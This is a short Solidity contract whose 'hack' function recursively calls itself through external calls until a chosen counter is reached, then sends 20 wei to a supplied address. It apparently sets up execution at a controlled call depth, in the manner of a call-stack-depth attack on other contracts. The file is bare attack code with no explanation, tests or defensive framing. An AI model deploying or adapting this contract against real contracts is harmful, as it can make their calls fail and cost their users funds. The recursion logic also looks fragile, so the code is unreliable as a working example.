pragma solidity ^0.4.0;
contract AA{
    uint256 public count=0;
    constructor () payable{}
    function init(address addr, uint256 max) payable{
        count =0;
        this.hack(addr,max);
    }
    function hack(address addr, uint256 max) payable{
        while (count < max) {
            count = count +1;
            this.hack(addr,max);
        }
        if (count == max) {
            addr.send(20);
        }
    }
}